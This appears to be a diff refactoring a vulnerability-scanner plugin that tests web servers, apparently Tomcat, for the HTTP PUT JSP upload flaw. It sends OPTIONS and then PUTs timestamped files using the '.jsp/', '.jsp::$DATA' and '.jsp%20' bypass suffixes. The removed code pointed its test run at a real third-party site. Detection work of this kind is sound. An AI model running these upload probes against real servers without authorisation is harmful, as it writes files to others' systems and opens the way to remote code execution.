@@ -1,34 +1,39 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# @author = 'orleven'
+# @author: 'orleven'
+
+import time
+from script import Script, SERVER_PORT_MAP
+
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.WEB
+        self.name = 'http put'
+        self.keyword = ['web', 'tomcat']
+        self.info = 'http put'
+        self.type = 'rce'
+        self.level = 'high'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
 
-def info(data=None):
-    info = {
-        "name": "tomcat put",
-        "info": "tomcat put.",
-        "level": "low",
-        "type": "info"
-    }
-    return info
-
-def prove(data):
-    data = init(data,'tomcat')
-    if data['base_url']:
-        for url in [ data['base_url'] + "1.jsp/", data['base_url'] + "1.jsp::$DATA", data['base_url'] + "1.jsp%20"]:
-            try:
-                headers = {"Content-Type":"application/x-www-form-urlencoded"}
-                _data = 'this is a test.'
-                res = curl('put', url,headers = headers,data = _data)
-                if res.status_code is 201:
-                    data['flag'] = 1
-                    data['data'].append({"page": 'tomcat put'})
-                    data['res'].append({"info": url, "key": "tomcat put"})
-            except Exception:
-                pass
-    return data
-
-
-if __name__=='__main__':
-    from script import init, curl
-    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        self.get_url()
+        if self.base_url != None:
+            path_list = list(set([
+                self.url_normpath(self.base_url, '/'),
+                self.url_normpath(self.url, './'),
+            ]))
+            for path in path_list:
+                try:
+                    res = self.curl('options',path+"/testbyme")
+                    allow = res.headers['Allow']
+                    if 'PUT' in allow:
+                        for _url in [str(int(time.time())) + '.jsp/',str(int(time.time())) + '.jsp::$DATA',str(int(time.time())) + '.jsp%20']:
+                            url =  path + _url
+                            res = self.curl('put', url)
+                            if res.status == 201 or res.status == 204:
+                                self.flag = 1
+                                self.req.append({"method": "put"})
+                                self.res.append({"info": url,"key":"PUT"})
+                except:
+                    pass
